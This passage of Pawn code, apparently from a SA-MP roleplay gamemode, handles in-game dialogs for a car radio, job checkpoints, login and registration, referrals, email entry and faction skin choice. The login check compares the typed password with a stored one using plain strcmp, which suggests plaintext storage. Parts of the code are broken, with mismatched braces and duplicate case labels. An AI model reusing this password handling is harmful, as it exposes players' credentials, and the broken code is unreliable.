                    new playercar = GetPlayerVehicleID(i);
                    if(playercar == vehicle)
                    {
                        PlayAudioStreamForPlayer(i, inputtext);
                    }
                }
    return 1;
}
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid)) {PlayAudioStreamForPlayer(i, CarRadio[GetPlayerVehicleID(playerid)]); CarRadioPlayed[i] = true;}
        }
              return 1;
}

    if(dialogid == 6542)
    {
        if(response)
        {


            if(listitem == 0)
            {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://208.85.241.142/");
            }
    if(listitem == 1)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://roseteam.ir/blog/wp-content/uploads/1_to-az-tolo-sobhi.mp3");
            }
            if(listitem == 2)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/05/20/Tik Taak - In Lahzeha [128].mp3");
        }
            if(listitem == 3)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1.ir/3/Hoorosh-Band-Mah-Pishooni_Remix-128.mp3");
        }
            if(listitem == 4)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1.ir/3/Mohsen-Ebrahimzadeh_Doneh-Doneh_Remix-128.mp3");
        }
            if(listitem == 5)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1.ir/3/Puzzle-Band_Remix_Dastan-128.mp3");
        }
            if(listitem == 6)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/05/06/ZedBazi - Pir Shodim Vali Bozorg Na/ZedBazi - Pir Shodim Vali Bozorg Na [128]/Alireza JJ & Sijal - Mehmooni Khodemoone (Ft Erfan, Sina Mafee, Sepehr Khalse, Behzad Leito, Paya & Magico).mp3");
        }
            if(listitem == 7)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/08/25/Arad Aria Ft. Kaveh Afagh and Yas - Ghesseye Zirzamin (New Version) [128].mp3");
        }
            if(listitem == 8)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/artist/Morteza Pashaei/Morteza Pashaei - Asre Paeizi [128].mp3");
        }
            if(listitem == 9)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/08/23/Morteza Pashaei - Yeki Hast [128].mp3");
        }
            if(listitem == 10)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1.ir/2/Mohsen-Ebrahimzadeh_Gerdab-Remix-128.mp3");
        }
            if(listitem == 11)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.3sotdownload.com/dl/91/7/Mohsen Yeganeh - Havaei Shodi.mp3");
        }
            if(listitem == 12)
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://www.ramsarsms.com/wp-content/uploads/2013/09/Talar-Music-Arousi.mp3");
  return 1;
        }
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid)) {PlayAudioStreamForPlayer(i, CarRadio[GetPlayerVehicleID(playerid)]); CarRadioPlayed[i] = true;}
        }
              return 1;
            }
        }
    if(dialogid == 1298)
    {
        if(response)
        {
    if(OnCheckpoint[playerid] == 1)
    {
    SCM(playerid,COLOR_LIGHTRED,"You already have an enable checkpoint.");
    return 1;
    }
            new message[256+1];
            if(listitem == 0)
            {
            format(message, 256, "You selected Los Santos Bus location, i give you a Checkpoint to follow this job", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            OnCheckpoint[playerid] = 1;
            SetPlayerCheckpoint(playerid, 1765.061889,-2031.958862,14.048107, 3);
            CP[playerid] = 54659;
            }
            if(listitem == 1)
            {
              format(message, 256, "You selected Las ventarus Bus location, i give you a Checkpoint to follow this job", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            OnCheckpoint[playerid] = 1;
            SetPlayerCheckpoint(playerid, 1909.430297,2351.376453,10.979915, 3);
            CP[playerid] = 54660;
              return 1;
            }
        }
    }
    if(dialogid == 1299)
    {
        if(response)
        {
    if(OnCheckpoint[playerid] == 1)
    {
    SCM(playerid,COLOR_LIGHTRED,"You already have an enable checkpoint.");
    return 1;
    }
    new message[256];
            if(listitem == 0)
            {
            format(message, 256, "You selected Farmer job 1 location, i give you a Checkpoint to follow this job", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            OnCheckpoint[playerid] = 1;
            SetPlayerCheckpoint(playerid,-382.6660,-1426.5121,26.2410, 3);
            CP[playerid] = 54680;
            }
            if(listitem == 1)
            {
            format(message, 256, "You selected Farmer job 2 location, i give you a Checkpoint to follow this job", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            OnCheckpoint[playerid] = 1;
            SetPlayerCheckpoint(playerid,-1061.110107,-1195.576660,129.728820, 3);
            CP[playerid] = 54689;
              return 1;
            }
        }
    }

//--------------------------
    new string[128];
    new ppName[24];
    GetPlayerName(playerid, ppName, sizeof(ppName));
    if(dialogid == 12346 || dialogid == 12347)
    {
        if(response)
        {
        if(!strlen(inputtext))
        {
        new loginstring[128];
        format(loginstring,sizeof(loginstring),"Password doesn't match your name!\n\nPlease reEnter your password below to login into your account.");
        ShowPlayerDialog(playerid,12347,DIALOG_STYLE_PASSWORD,"Login",loginstring,"Login","Exit");
        gPlayerLogTries[playerid] ++;
        if(gPlayerLogTries[playerid] >= 5) { KickWithMessage(playerid, COLOR_LIGHTRED,"You have been kicked, reason: Incorrect Password 5/5"); }
        return 1;
        }
            if(!strcmp(inputtext,PlayerInfo[playerid][pKey]))
            {
                LoadAccount(playerid);
                OnFirstSpawn[playerid] = true;
            }
            else
            {
                new loginstring[128];
                format(loginstring,sizeof(loginstring),"Password doesn't match your name!\n\nPlease reEnter your password below to login into your account.");
                ShowPlayerDialog(playerid,12347,DIALOG_STYLE_PASSWORD,"Login",loginstring,"Login","Exit");
                gPlayerLogTries[playerid] ++;
                if(gPlayerLogTries[playerid] >= 5) { KickWithMessage(playerid, COLOR_LIGHTRED,"You have been kicked, reason: Incorrect Password 5/5"); }
                return 1;
            }
            }
            else
            {
            KickWithMessage(playerid,COLOR_LIGHTRED,"you have been kicked.");
            }
        }
        if(dialogid == 12345)
        {
            if(response)
            {
                if(FindBadSign(inputtext))
                {
                        ShowPlayerDialog(playerid,12345,DIALOG_STYLE_PASSWORD,"Account Registration","You used illegal chracter on your password (allowed: A-Z, a-z, 0-9, (), [], _)\nPlease register an account by entering your desired password below.","Register","Quit");
                        return 1;
                }
                if(strlen(inputtext) >= 128)
                {
                    SCM(playerid,COLOR_ALI,"Invalid Password Type a password with -128 length");
                    new regstring[128];
                    new regname[64];
                    GetPlayerName(playerid,regname,sizeof(regname));
                    format(regstring,sizeof(regstring),"{BECBFC}Welcome to the server, {95A3FF}%s{BECBFC}! \n\nPlease register an account by entering your desired password below.",regname);
                    ShowPlayerDialog(playerid,12345,DIALOG_STYLE_PASSWORD,"Account Registration",regstring,"Register","Quit");
                    return 1;
               }
               if(strlen(inputtext) >= 2)
               {
                    CreateAccount(playerid,inputtext);
                    OnFirstSpawn[playerid] = true;
               }
               else
                {
                    new regstring[128];
                    new regname[64];
                    GetPlayerName(playerid,regname,sizeof(regname));
                    format(regstring,sizeof(regstring),"{BECBFC}Welcome to the server, {95A3FF}%s{BECBFC}! \n\nPlease register an account by entering your desired password below.",regname);
                    ShowPlayerDialog(playerid,12345,DIALOG_STYLE_PASSWORD,"Account Registration",regstring,"Register","Quit");
                }
            }
            else
            {
                KickWithMessage(playerid,COLOR_LIGHTRED,"you have been kicked.");
            }
        }
        if(dialogid == 61)
        {
            if(response)
            {
                if(listitem == 0)
                {
                     SetPlayerFightingStyle (playerid, FIGHT_STYLE_ELBOW);
                     SCM(playerid, COLOR_CRS1, "INFO: You known now a new fight style, elbow.");
                }
                if(listitem == 1)
                {
                     SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
                     SCM(playerid, COLOR_CRS1, "INFO: You known now a new fight style, boxing.");
                }
                if(listitem == 2)
                {
                     SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
                     SCM(playerid, COLOR_CRS1, "INFO: You known now a new fight style, grabkick.");
                }
                if(listitem == 3)
                {
                     SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
                     SCM(playerid, COLOR_CRS1, "INFO: You known now a new fight style, kneehead.");
                }
                if(listitem == 4)
                {
                     SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
                     SCM(playerid, COLOR_CRS1, "INFO: You known now a new fight style, kungfu.");
                }
                if(listitem == 5)
                {
                     SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
                     SCM(playerid, COLOR_CRS1, "INFO: You known now a new fight style, normal.");
                }
            }
        }
        if(dialogid == 418)
        {
            if(response)
            {
                 PlayerInfo[playerid][pLanguage] = 1;
                 SaveKonVal(playerid, "pLanguage", 1);
                 ShowPlayerDialog(playerid, 985, DIALOG_STYLE_MSGBOX,"{57e547}Aya Kasi Shoma Ra Be Inje Moarefi Karde?","Agar Kasi {57e547}JoKeR GaminG {FFFFFF} Ra Be Shoma Moarefi Karde ID Referral On Ra Vared Konid.\n/MyReferral","Bale","Kheir");
                 SetPlayerVirtualWorld(playerid, (playerid + 1));
                 //SaveAccount(playerid);
                 return 1;
            }
            PlayerInfo[playerid][pLanguage] = 2;
            SaveKonVal(playerid, "pLanguage", 2);
            ShowPlayerDialog(playerid, 987, DIALOG_STYLE_MSGBOX,"Referral ID infromation","Do you have any referral(player that brought you here)?","Yes","No");
            SetPlayerVirtualWorld(playerid, (playerid + 1));
            //SaveAccount(playerid);
            return 1;
        }
        if(dialogid == 980)
        {
            if(!response)
            {
                if(PINFO[playerid][pLanguage] == 1) return ShowPlayerDialog(playerid,986,DIALOG_STYLE_INPUT,"Etelaat moarefi","Lotfan referral id an shakhs ra dar zir benevisid.","OK","Bargasht");
                else return ShowPlayerDialog(playerid, 988, DIALOG_STYLE_INPUT, "Referral ID infromation", "Please enter the referral id below", "OK", "Back");
            }
            PINFO[playerid][pReferral] = ReferralID[playerid];
            SaveKonVal(playerid, "pReferral", ReferralID[playerid]);
            if(PINFO[playerid][pLanguage] == 1) return ShowPlayerDialog(playerid, 700, DIALOG_STYLE_MSGBOX,"Jensiat character", "Jensiat character ra entekhab konid.","Mard", "Zan");
            else return ShowPlayerDialog(playerid, 720, DIALOG_STYLE_MSGBOX,"Character Gender", "Please select the gender of your character.","Male", "Female");
        }
        if(dialogid == 985)
        {
            if(!response) return ShowPlayerDialog(playerid, 700, DIALOG_STYLE_MSGBOX,"Jensiat character", "Jensiat character ra entekhab konid.","Mard", "Zan");
            ShowPlayerDialog(playerid,986,DIALOG_STYLE_INPUT,"Etelaat moarefi","Lotfan referral id an shakhs ra dar zir benevisid.","OK","Bargasht");
        }
        if(dialogid == 986)
        {
            if(!strlen(inputtext)) return ShowPlayerDialog(playerid,986,DIALOG_STYLE_INPUT,"Etelaat moarefi","Lotfan referral id an shakhs ra dar zir benevisid.","OK","Bargasht");
            if(!response) return ShowPlayerDialog(playerid, 985, DIALOG_STYLE_MSGBOX,"Etelaat moarefi","Aya shoma referral id darid (aya kasi injaro be shoma moarefi karde)?","Bale","Kheir");
            new rId = strval(inputtext);//lol
            if(rId < 1) return ShowPlayerDialog(playerid,986,DIALOG_STYLE_INPUT,"Etelaat moarefi","ID referral vared shode eshtebah ast.\n\nLotfan referral id an shakhs ra dar zir benevisid.","Sabt","Bargasht");
            SearchForReferral(playerid, rId, 1);
        }
        if(dialogid == 987)
        {
            if(!response) return ShowPlayerDialog(playerid, 720, DIALOG_STYLE_MSGBOX,"Character Gender", "Please select the gender of your character.","Male", "Female");
            ShowPlayerDialog(playerid, 988, DIALOG_STYLE_INPUT, "Referral ID infromation", "Please enter the referral id below", "OK", "Back");
        }
        if(dialogid == 988)
        {
            if(!strlen(inputtext)) return ShowPlayerDialog(playerid, 988, DIALOG_STYLE_INPUT, "Referral ID infromation", "Please enter the referral id below", "OK", "Back");
            if(!response) return ShowPlayerDialog(playerid, 987, DIALOG_STYLE_MSGBOX,"Referral ID infromation","Do you have any referral(player that brought you here)?","Yes","No");
            new rID = strval(inputtext);
            if(rID < 1) return ShowPlayerDialog(playerid, 988, DIALOG_STYLE_INPUT, "Referral ID infromation", "Invalid referral id.\n\nPlease enter the referral id below", "OK", "Back");
            SearchForReferral(playerid, rID, 2);
        }
        if(dialogid == 700)
        {
            if(response)
            {
                PlayerInfo[playerid][pSex] = 1;
                SaveKonVal(playerid, "pSex", 1);
                //SetPlayerSkin(playerid, 170);
                PlayerInfo[playerid][cSkin] = 29;
                SaveKonVal(playerid, "cSkin", 29);
                ShowPlayerDialog(playerid,7856,DIALOG_STYLE_INPUT,"Email","Baraye ertebate ma ba shoma va hamchenin\n\nbaraye faramooshie ramzetoon Email etoono dorost vared konid.","Bashe","");
                return 1;
            }
            PlayerInfo[playerid][pSex] = 2;
            //SaveKonVal(playerid, "pSex", 2);
            SetPlayerSkin(playerid, 192);
            PlayerInfo[playerid][cSkin] = 12;
            SaveKonVal(playerid, "cSkin", 12);
            ShowPlayerDialog(playerid,7856,DIALOG_STYLE_INPUT,"Email","Baraye ertebate ma ba shoma va hamchenin\n\nbaraye faramooshie ramzetoon Email etoono dorost vared konid.","Bashe","");
            return 1;
        }
        if(dialogid == 7856)
        {
            new aCount,dotCount,atCount,numCount;//by eblis
            for(new i = 0; i < strlen(inputtext); i++)
            {
            switch(inputtext[i])
            {
                case 0x30..0x39: numCount++;
                case 0x41..0x5A: aCount++;
                case 0x61..0x7A: aCount++;
                case '.': dotCount++;
                case '@': atCount++;
                case ' ': return ShowPlayerDialog(playerid,7856,DIALOG_STYLE_INPUT,"Email","Baraye ertebate ma ba shoma va hamchenin\n\nbaraye faramooshie ramzetoon Email etoono dorost vared konid.\n\n Email vared shode eshtebah ast.","Bashe","");
                case ' ': return ShowPlayerDialog(playerid,7856,DIALOG_STYLE_INPUT,"Email","Baraye ertebate ma ba shoma va hamchenin\n\nbaraye faramooshie ramzetoon Email etoono dorost vared konid.\n\n Email vared shode eshtebah ast.","Bashe","");
                case '\'': return ShowPlayerDialog(playerid,7856,DIALOG_STYLE_INPUT,"Email","Baraye ertebate ma ba shoma va hamchenin\n\nbaraye faramooshie ramzetoon Email etoono dorost vared konid.\n\n Email vared shode eshtebah ast.","Bashe","");
                case '\"': return ShowPlayerDialog(playerid,7856,DIALOG_STYLE_INPUT,"Email","Baraye ertebate ma ba shoma va hamchenin\n\nbaraye faramooshie ramzetoon Email etoono dorost vared konid.\n\n Email vared shode eshtebah ast.","Bashe","");
            }
            }
          if(response && strlen(inputtext) >= 5 && (aCount >= 1 || numCount >= 1) && atCount == 1 && dotCount >= 1)
          {
          new strs[200];
          mysql_escape_string(inputtext, strs, handle, 200);
          strmid(PlayerInfo[playerid][pEmail],strs,0,sizeof(strs),128);
          SaveKonStr(playerid, "pEmail", PINFO[playerid][pEmail]);
          format(strs,200,"Email Shoma: %s",inputtext);
          SCM(playerid,COLOR_YELLOW,strs);
          PINFO[playerid][pReg] = 1;
          SaveKonVal(playerid, "pReg", 1);

	        new rand;
		rand = random(sizeof(CarSpawn));
                new carid;


                carid = CreateVehicle(462, CarSpawn[rand][0], CarSpawn[rand][1], CarSpawn[rand][2], 89.143226, 1, 1,-1);

                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;

                PlayerInfo[playerid][cLocationx] = CarSpawn[rand][0];
                SaveKonFloat(playerid, "cLocationx", CarSpawn[rand][0]);
                PlayerInfo[playerid][cLocationy] = CarSpawn[rand][1];
                SaveKonFloat(playerid, "cLocationy", CarSpawn[rand][1]);
                PlayerInfo[playerid][cLocationz] = CarSpawn[rand][2];
                SaveKonFloat(playerid, "cLocationz", CarSpawn[rand][2]);
                PlayerInfo[playerid][cAngle] = 89.143226;
                SaveKonFloat(playerid, "cAngle", 89.143226);

                PlayerInfo[playerid][cColor1] = 1;
                SaveKonVal(playerid, "cColor1", 1);
                PlayerInfo[playerid][cColor2] = 1;
                SaveKonVal(playerid, "cColor2", 1);
                PlayerInfo[playerid][cModel] = 462;
                SaveKonVal(playerid, "cModel", 462);
                PlayerInfo[playerid][cPrice] = 1;
                SaveKonVal(playerid, "cPrice", 1);
                new string1[256];
                format(string1, sizeof(string1), "ServerVeh");
                strmid(PlayerInfo[playerid][cPlate], string1, 0, strlen(string1), 255);
                SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
                SetVehicleNumberPlate(carid,"ServerVeh");
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                PlayerInfo[playerid][cFixed] = 1;
                SaveKonVal(playerid, "cFixed", 1);
                PlayerInfo[playerid][cFuel] = 100;
                SaveKonVal(playerid, "cFuel", 100);
                PlayerInfo[playerid][cHealth] = 1000.0;
                SaveKonFloat(playerid, "cHealth", 1000);
                SetVehicleParamsEx(PlayerInfo[playerid][pCar], 0, 0, 0, 1, 0, 0, 0);

          //SaveAccount(playerid);
          ShowPlayerDialog(playerid, 710, DIALOG_STYLE_MSGBOX,"Etelaat sabte nam", "Khob, alan ye seri amoozesharo behetoon neshoon midam.","Bashe", "");
          }
          else
          {
          ShowPlayerDialog(playerid,7856,DIALOG_STYLE_INPUT,"Email","Baraye ertebate ma ba shoma va hamchenin\n\nbaraye faramooshie ramzetoon Email etoono dorost vared konid.\n\n Email vared shode eshtebah ast.","Bashe","");
          }
        }
        if(dialogid == 7857)
        {
            new aCount,dotCount,atCount,numCount;//by eblis
            for(new i = 0; i < strlen(inputtext); i++)
            {
            switch(inputtext[i])
            {
                case 0x30..0x39: numCount++;
                case 0x41..0x5A: aCount++;
                case 0x61..0x7A: aCount++;
                case '.': dotCount++;
                case '@': atCount++;
                case ' ': return ShowPlayerDialog(playerid,7857,DIALOG_STYLE_INPUT,"Email","To contact us with you and\n\nFor forgot password system access Enter your Email below.\n\nThis Email is Invalid.","Okay","");
                case ' ': return ShowPlayerDialog(playerid,7857,DIALOG_STYLE_INPUT,"Email","To contact us with you and\n\nFor forgot password system access Enter your Email below.\n\nThis Email is Invalid.","Okay","");
                case '\'': return ShowPlayerDialog(playerid,7857,DIALOG_STYLE_INPUT,"Email","To contact us with you and\n\nFor forgot password system access Enter your Email below.\n\nThis Email is Invalid.","Okay","");
                case '\"': return ShowPlayerDialog(playerid,7857,DIALOG_STYLE_INPUT,"Email","To contact us with you and\n\nFor forgot password system access Enter your Email below.\n\nThis Email is Invalid.","Okay","");
            }
            }
          if(response && strlen(inputtext) >= 5 && (aCount >= 1 || numCount >= 1) && atCount == 1 && dotCount >= 1)
          {
          new strs[200];
          mysql_escape_string(inputtext, strs, handle, 200);
          strmid(PlayerInfo[playerid][pEmail],strs,0,sizeof(strs),128);
          SaveKonStr(playerid, "pEmail", PINFO[playerid][pEmail]);
          format(strs,200,"Your email is %s.",inputtext);
          SCM(playerid,COLOR_YELLOW,strs);
          PINFO[playerid][pReg] = 1;
          SaveKonVal(playerid, "pReg", 1);
          //SaveAccount(playerid);
          ShowPlayerDialog(playerid, 723, DIALOG_STYLE_MSGBOX,"Account Registration", "I Showing you some tutorials to know how to play and rules.","Next", "");
          }
          else
          {
          ShowPlayerDialog(playerid,7857,DIALOG_STYLE_INPUT,"Email","To contact us with you and\n\nFor forgot password system access Enter your Email below.\n\nThis Email is Invalid.","Okay","");
          }
        }
        if(dialogid == 720)
        {
            if(response)
            {
                PlayerInfo[playerid][pSex] = 1;
                SaveKonVal(playerid, "pSex", 1);
                //SetPlayerSkin(playerid, 170);
                PlayerInfo[playerid][cSkin] = 250;
                SaveKonVal(playerid, "cSkin", 250);
                ShowPlayerDialog(playerid,7857,DIALOG_STYLE_INPUT,"Email","To contact us with you and\n\nFor forgot password system access Enter your Email below.","Okay","");
                return 1;
            }
            PlayerInfo[playerid][pSex] = 2;
            SaveKonVal(playerid, "pSex", 2);
            //SetPlayerSkin(playerid, 192);
            PlayerInfo[playerid][cSkin] = 192;
            SaveKonVal(playerid, "cSkin", 192);
            ShowPlayerDialog(playerid,7857,DIALOG_STYLE_INPUT,"Email","To contact us with you and\n\nFor forgot password system access Enter your Email below.","Okay","");
            return 1;
        }
        if(dialogid == 710)
        {
            if(response)
            {
                //SaveAccount(playerid);
                TutTime[playerid] = 1;
            }
        }
        if(dialogid == 723)
        {
            if(response)
            {
                //SaveAccount(playerid);
                TutTime1[playerid] = 1;
            }
        }
        if(dialogid == 427)//==============skins faction=========  (warning warning !!!!!!!! Dont Change Anything or Skins dont work(rouz chizio taghir nadia jedan dg kar nemikone)!
        {
            if(response)
            {
                switch (SelectCharID[playerid])
                {
                case 1: //Police Force
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[1][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[1][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[2][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[2][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[3][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[3][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[4][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[4][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[5][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[5][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[6][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[6][0]; }
                    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[7][0]); SelectCharPlace[playerid] = 8; ChosenSkin[playerid] = JoinPed[7][0]; }
                    else if(SelectCharPlace[playerid] == 8) { SetPlayerSkin(playerid, JoinPed[8][0]); SelectCharPlace[playerid] = 9; ChosenSkin[playerid] = JoinPed[8][0]; }
                    else if(SelectCharPlace[playerid] == 9) { SetPlayerSkin(playerid, JoinPed[0][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[0][0]; }
                }
                case 2: //FBI/ATF
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[10][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[10][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[11][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[11][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[12][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[12][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[13][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[13][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[14][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[14][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[9][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[9][0]; }
                }
                case 3: //National Guard
                {

                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[16][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[16][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[15][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[15][0]; }
                }
                case 4: //Fire&Ambulance
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[18][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[18][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[19][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[19][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[20][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[20][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[21][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[21][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[22][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[22][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[23][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[23][0]; }
                    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[24][0]); SelectCharPlace[playerid] = 8; ChosenSkin[playerid] = JoinPed[24][0]; }
                    else if(SelectCharPlace[playerid] == 8) { SetPlayerSkin(playerid, JoinPed[17][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[17][0]; }
                }
                case 5: //Silence Mafia
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[26][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[26][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[27][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[27][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[28][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[28][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[29][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[29][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[30][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[30][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[31][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[31][0]; }
                    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[25][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[25][0]; }
                }
                case 6: //The Killers family
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[33][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[33][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[34][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[34][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[35][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[35][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[36][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[36][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[37][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[37][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[32][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[32][0]; }
                }
                case 8: //Hitman Agency
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[39][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[39][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[40][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[40][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[41][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[41][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[42][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[42][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[43][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[43][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[38][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[38][0]; }
                }
                case 9: //News Reporters
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[45][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[45][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[46][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[46][0]; }
